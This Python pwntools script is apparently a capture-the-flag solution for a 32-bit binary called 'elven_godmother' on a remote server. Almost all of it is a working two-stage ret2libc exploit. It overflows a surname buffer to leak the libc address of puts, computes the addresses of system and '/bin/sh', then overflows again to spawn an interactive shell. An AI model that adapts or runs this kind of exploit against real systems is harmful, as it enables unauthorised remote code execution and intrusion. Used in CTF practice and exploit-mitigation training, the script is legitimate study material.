#!/usr/bin/env python3
from pwn import *

BIN  = "./elven_godmother"
IP   = "141.85.224.106"
PORT = "31344"

context.bits = 32
context.endian = 'little'
context.binary = BIN
context.log_level = 'debug'
# io = process(BIN)
# gdb.attach(io)
# libc = ELF('/lib/i386-linux-gnu/libc-2.31.so')

io = remote(IP, PORT)
libc = ELF('./libc.so.6')

system_libc_offset = libc.symbols['system']
puts_libc_offset = libc.symbols['puts']
bin_sh_offset = next(libc.search(b'/bin/sh'))

print("system_offset: " + hex(system_libc_offset))
print("puts_offset: " + hex(puts_libc_offset))
print("binsh_offset: " + hex(bin_sh_offset))

main_addr = 0x08048882
puts_got = 0x804d024
puts_plt = 0x8048520

# Stage 1 - leak puts from libc

# Recv begining junk
io.recvuntil(b"? ")

# Send First Name
io.send(b"PrenumeSmecher".ljust(50, b"\x41") + b"\n")

# More junk
io.recvuntil(b"? ")

# Cast a powerful incantation to overflow the buffer
ancient_elven_prayer_first_half = b"Inger, ingerasul meu, Ce mi te-a dat Dumnezeu, Totdeauna fii cu mine Si ma-nvata sa fac bine! Eu sunt mic - tu fa-ma mare; Eu sunt slab - tu fa-ma tare; In tot locul ma-nsoteste Si de rele ma fereste!"

# Send Surname + overwrite addresses to leak puts@libc
io.send(ancient_elven_prayer_first_half.ljust(218, b"\x41") + b"B" * 4 + pack(puts_plt) + pack(main_addr)  + pack(puts_got) + b"\n")

# Time to choose our gender
io.recv()

# Male, for now
io.send(b"m" + b"\n")

output = io.recv()

puts_libc = unpack(output[:4].ljust(4, b"\x00"))
system_libc = puts_libc - puts_libc_offset + system_libc_offset
bin_sh_libc = puts_libc - puts_libc_offset + bin_sh_offset

print("puts@libc: " + hex(puts_libc))
print("system@libc: " + hex(system_libc))
print("binsh@libc: " + hex(bin_sh_libc))

# Stage 2 - calling system

# Sending the First Name again (we already received everything)
io.send(b"PrenumeSmecher".ljust(50, b"\x41") + b"\n")

# Second half of the incantation to rid the program of unholy powers
ancient_elven_prayer_second_half = b"Doamne, ingerasul Tau Fie pazitorul meu Sa ma apere mereu De ispita celui rau! Doamne, ingerul ce-mi dai M-ajute s-ajung in rai: Mantuirea s-o primesc Langa Tine, Domn Ceresc!"

io.recvuntil(b"? ")

# Send the surname + overwrite addresses to call libc's system
io.send(ancient_elven_prayer_second_half.ljust(218, b"\x41") + b"B" * 4 + pack(system_libc) + pack(main_addr) + pack(bin_sh_libc) + b"\n")

# Time to choose our gender
io.recv()

# Still male
io.send(b"m" + b"\n")

# Get shell
io.interactive()
